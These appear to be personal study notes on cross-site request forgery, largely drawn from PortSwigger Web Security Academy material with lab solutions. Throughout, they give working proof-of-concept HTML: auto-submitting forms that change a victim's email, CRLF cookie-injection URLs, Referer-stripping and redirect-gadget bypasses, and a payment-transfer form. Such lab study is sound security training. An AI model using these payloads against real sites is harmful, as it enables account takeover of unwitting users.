Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
```html
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
## How to deliver a CSRF exploit
Note that some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable website. In this situation, the attacker may not need to employ an external site, and can directly feed victims a malicious URL on the vulnerable domain. In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this: 
```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```
# Bypassing CSRF token validation
## Common flaws in CSRF token validation
### Validation of CSRF token depends on request method
Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used. In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
```http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

```html
<html>
    <body>
        <form action="https://target/my-account/change-email?email=pruebaw%40normal-user.net" method="GET">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
### Validation of CSRF token depends on token being present
Some applications correctly validate the token when it is present but skip the validation if the token is omitted. In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net
```

```html
<html>
    <body>
        <form action="https://target/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
### CSRF token is not tied to the user session
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.
```html
<html>
    <body>
        <form action="https://target/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
            <input type="hidden" name="csrf" value="tTPx90LX1kB9fIuxrtPrGbuRJnvPdSSH" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
- Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
- Make a note of the value of the CSRF token, then drop the request.
### CSRF token is tied to a non-session cookie
In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. 
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```
If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
#URL decode ->
/?search=test
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```

```html
<html>
    <body>
        <form id="" action="https://target/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
            <input type="hidden" name="csrf" value="e9eS3baTM3T8xqqR0UpgETR6l5Kb5QcE" />
        </form>
        <img src="https://target/?search=test%0d%0aSet-Cookie:%20csrfKey=i9X4YbcoZTRvl5NlOU4WcbX9NIo2cGSM%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```
### CSRF token is simply duplicated in a cookie
Some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```
Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
```html
<html>
    <body>
        <form id="" action="https://target/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
            <input type="hidden" name="csrf" value="e9eS3baTM3T8xqqR0UpgETR6l5Kb5QcE" />
        </form>
        <img src="https://target/?search=test%0d%0aSet-Cookie:%20csrf=e9eS3baTM3T8xqqR0UpgETR6l5Kb5QcE%3b%20SameSite=None" onerror="document.forms[0].submit()">
    </body>
</html>
```
# Bypassing SameSite cookie restrictions
## Bypassing SameSite Lax restrictions using GET requests
In practice, servers aren't always fussy about whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. If they also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a `GET` request from the victim's browser.
Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

```html
<html>
    <body>
        <form action="https://target/my-account/change-email" method="GET">
	        <input type="hidden" name="_method" value="POST">
            <input type="hidden" name="email" value="pwneqqq@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
## Bypassing SameSite restrictions using on-site gadgets
If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.
One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection). Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place. If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.
```java
<script>
    document.location = "https://target/post/comment/confirmation?postId=../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```
## Bypassing SameSite restrictions via vulnerable sibling domains
Make sure you thoroughly audit all of the available attack surface, including any sibling domains. In particular, vulnerabilities that enable you to elicit an arbitrary secondary request, such as XSS, can compromise site-based defenses completely, exposing all of the site's domains to cross-site attacks. In addition to classic CSRF, don't forget that if the target website supports WebSockets, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake. For more details, see our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets).

Lab pendient, burp profesional
# Bypassing Referer-based CSRF defenses
Aside from defenses that employ CSRF tokens, some applications make use of the HTTP `Referer` header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. 
## Validation of Referer depends on header being present
Some applications validate the `Referer` header when it is present in requests but skip the validation if the header is omitted. In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the `Referer` header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:
```
<meta name="referrer" content="never">
```

```html
<html>
    <body>
        <form action="https://0a7d00f30475ae3b81c5206d00a900e9.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
			<meta name="referrer" content="never">      
		</form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
## Validation of Referer can be circumvented
Some applications validate the `Referer` header in a naive way that can be bypassed. For example, if the application validates that the domain in the `Referer` starts with the expected value, then the attacker can place this as a subdomain of their own domain:
`http://vulnerable-website.com.attacker-website.com/csrf-attack`
Likewise, if the application simply validates that the `Referer` contains its own domain name, then the attacker can place the required value elsewhere in the URL:
`http://attacker-website.com/csrf-attack?vulnerable-website.com`
Notae: You can override this behavior by making sure that the response containing your exploit has the `Referrer-Policy: unsafe-url` header set (note that `Referrer` is spelled correctly in this case, just to make sure you're paying attention!). This ensures that the full URL will be sent, including the query string.

```html
<form method="POST" action="https://target/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>
<script>
	history.pushState("", "", "/?0aa6004104fa446881772b8800ee000c.web-security-academy.net")
    document.forms[0].submit();
</script>
```
![516](Pasted%20image%2020261019161309.png)
